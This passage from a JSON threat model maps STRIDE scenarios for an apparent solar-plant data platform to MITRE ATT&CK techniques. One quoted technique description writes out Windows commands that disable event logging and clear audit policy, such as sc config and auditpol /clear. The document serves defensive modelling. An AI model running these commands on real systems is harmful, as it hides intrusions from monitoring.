                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker anonymously alters metadata by injecting malicious records into the system.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks robust input validation and logging mechanisms.",
                    "Role": "System design",
                    "Condition": "Poor input sanitization and absence of input logging."
                },
                {
                    "Assumption": "The attacker can access input interfaces anonymously.",
                    "Role": "Attacker",
                    "Condition": "Insufficient access controls on metadata input interfaces."
                },
                {
                    "Assumption": "There is no way to link input records to a source.",
                    "Role": "System design",
                    "Condition": "Lack of source and context tracking for metadata records."
                }
            ],
            "Potential Impact": "Injected malicious metadata, causing incorrect model predictions and operational mishaps.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "metadata",
                "input validation",
                "injection"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider deletes or alters log files to cover their tracks after performing unauthorized operations.",
            "Assumptions": [
                {
                    "Assumption": "Log files are not protected against unauthorized access.",
                    "Role": "System design",
                    "Condition": "Lack of access controls or redundancy for logs."
                },
                {
                    "Assumption": "The system does not implement tamper-evident logging mechanisms.",
                    "Role": "System design",
                    "Condition": "Logs can be altered without detection."
                },
                {
                    "Assumption": "The attacker knows where logs are stored and has the necessary permissions.",
                    "Role": "Attacker",
                    "Condition": "Insider knowledge and elevated permissions."
                }
            ],
            "Potential Impact": "Loss of accountability, making it difficult to detect and address the security breach.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "file deletion",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted data transmitted from sensors to the Data Logger, gaining access to sensitive operational data.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted between sensors and Data Logger.",
                    "Role": "System design",
                    "Condition": "Lack of encryption protocols."
                },
                {
                    "Assumption": "The attacker can access network channels used for data transmission.",
                    "Role": "Attacker",
                    "Condition": "Compromised network or insufficient network security."
                },
                {
                    "Assumption": "Sensitive operational data is not obfuscated or protected.",
                    "Role": "System design",
                    "Condition": "Plain-text transmission of sensitive data."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational data, leading to potential manipulation and strategic disadvantages.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network",
                "interception",
                "data transmission"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker accesses the AI/ML models stored in the TOREADOR platform and extracts sensitive operational insights.",
            "Assumptions": [
                {
                    "Assumption": "Stored AI/ML models are not sufficiently protected by access controls.",
                    "Role": "System design",
                    "Condition": "Weak access control measures on stored models."
                },
                {
                    "Assumption": "The attacker gains access to the cloud environment.",
                    "Role": "Attacker",
                    "Condition": "Compromised cloud credentials or permissions."
                },
                {
                    "Assumption": "AI/ML models contain sensitive insights that are not encrypted.",
                    "Role": "System design",
                    "Condition": "Lack of encryption of sensitive model data."
                }
            ],
            "Potential Impact": "Unauthorized access to predictive models, leading to business and operational intelligence leakage.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud environment",
                "model extraction",
                "access control"
            ],
            "mitre_technique": {
                "name": "Cloud API",
                "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ",
                "id": "attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf",
                "technique_id": "T1059.009"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive metadata related to solar power plants is leaked due to a misconfigured cloud storage.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage configuration does not implement strict access controls.",
                    "Role": "System design",
                    "Condition": "Misconfigured or lax access control settings."
                },
                {
                    "Assumption": "The attacker finds and exploits the misconfiguration to gain access.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of the cloud environment and its vulnerabilities."
                },
                {
                    "Assumption": "Sensitive metadata is not encrypted at rest.",
                    "Role": "System design",
                    "Condition": "Lack of encryption for stored metadata."
                }
            ],
            "Potential Impact": "Unintended disclosure of sensitive metadata, leading to privacy violations and operational risks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud storage",
                "misconfiguration",
                "metadata"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack on the Dashboard, making it unavailable to users.",
            "Assumptions": [
                {
                    "Assumption": "The system does not adequately mitigate high-volume traffic attacks.",
                    "Role": "System design",
                    "Condition": "Lack of DDoS protection mechanisms."
                },
                {
                    "Assumption": "The attacker can generate significant traffic loads to overwhelm the Dashboard services.",
                    "Role": "Attacker",
                    "Condition": "Access to sufficient botnet resources."
                },
                {
                    "Assumption": "The Dashboard is directly exposed to the Internet without adequate filtering.",
                    "Role": "System design",
                    "Condition": "Insufficient network ingress filtering."
                }
            ],
            "Potential Impact": "Inability of users to access critical operational insights, leading to downtimes and potential operational failures.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "dashboard",
                "network"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disrupts the communication between the Data Logger and the Receiver by overwhelming the network with malicious traffic.",
            "Assumptions": [
                {
                    "Assumption": "Network channels are not protected against high-volume traffic attacks.",
                    "Role": "System design",
                    "Condition": "Lack of network traffic analysis and mitigation."
                },
                {
                    "Assumption": "The attacker can inject sufficient malicious traffic to disrupt normal communication.",
                    "Role": "Attacker",
                    "Condition": "Access to malicious traffic generation tools or botnets."
                },
                {
                    "Assumption": "No failover mechanisms are in place between the Data Logger and the Receiver.",
                    "Role": "System design",
                    "Condition": "Lack of redundancy and fail-safes in communication pathways."
                }
            ],
            "Potential Impact": "Loss of data transmission, leading to missing critical sensor data and delayed operational decisions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network traffic",
                "communication disruption",
                "data logger"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a vulnerability in the TOREADOR platform causing it to crash and become unavailable.",
            "Assumptions": [
                {
                    "Assumption": "The platform has an existing, unpatched vulnerability.",
                    "Role": "System design",
                    "Condition": "Delays or gaps in applying security patches."
                },
                {
                    "Assumption": "The attacker knows of and can exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Access to exploit code or vulnerability details."
                },
                {
                    "Assumption": "The platform does not have sufficient monitoring and immediate remediation capabilities.",
                    "Role": "System design",
                    "Condition": "Lack of real-time monitoring and rapid incident response."
                }
            ],
            "Potential Impact": "Unavailability of the platform results in halting model training/validation and operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "vulnerability",
                "platform crash",
                "unavailability"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges from a user account to an administrative account within the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "The system has exploitable privilege escalation paths.",
                    "Role": "System design",
                    "Condition": "Privilege escalation vulnerabilities exist."
                },
                {
                    "Assumption": "User accounts have wide access within the Dashboard.",
                    "Role": "System design",
                    "Condition": "Over-privileged user roles."
                },
                {
                    "Assumption": "The attacker has access to a user account.",
                    "Role": "Attacker",
                    "Condition": "Credential compromise or session hijacking."
                }
            ],
            "Potential Impact": "Gaining administrative access, leading to unauthorized system changes and control over operational decisions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "user accounts",
                "administrative access",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Permission Groups Discovery",
                "description": "Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.\n\nAdversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)",
                "id": "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce",
                "technique_id": "T1069"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a vulnerability in the Anonymity Agent to execute arbitrary code with elevated privileges.",
            "Assumptions": [
                {
                    "Assumption": "The Anonymity Agent contains an exploitable vulnerability.",
                    "Role": "System design",
                    "Condition": "Unpatched software or zero-day vulnerability."
                },
                {
                    "Assumption": "The attacker has access to the component with the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Network access or initial foothold."
                },
                {
                    "Assumption": "The vulnerability allows code execution with elevated privileges.",
                    "Role": "System design",
                    "Condition": "Improper permission configurations or lack of security checks."
                }
            ],
            "Potential Impact": "Execution of arbitrary code with elevated privileges, allowing deep system compromise and potential data manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "vulnerability",
                "code execution",
                "anonymity agent"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a misconfiguration in the TOREADOR platform to gain full administrative access.",
            "Assumptions": [
                {
                    "Assumption": "The platform's configuration does not enforce strict access control policies.",
                    "Role": "System design",
                    "Condition": "Misconfigured or default settings."
                },
                {
                    "Assumption": "The attacker can discover and exploit the misconfiguration.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of misconfigurations or configuration auditing."
                },
                {
                    "Assumption": "The platform lacks mitigation mechanisms to prevent privilege escalation.",
                    "Role": "System design",
                    "Condition": "Lack of security best practices and hardening guides."
                }
            ],
            "Potential Impact": "Full administrative access allows for deep control and potential malicious activity across the entire platform.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "misconfiguration",
                "administrative access",
                "platform"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        }
    ]
}
]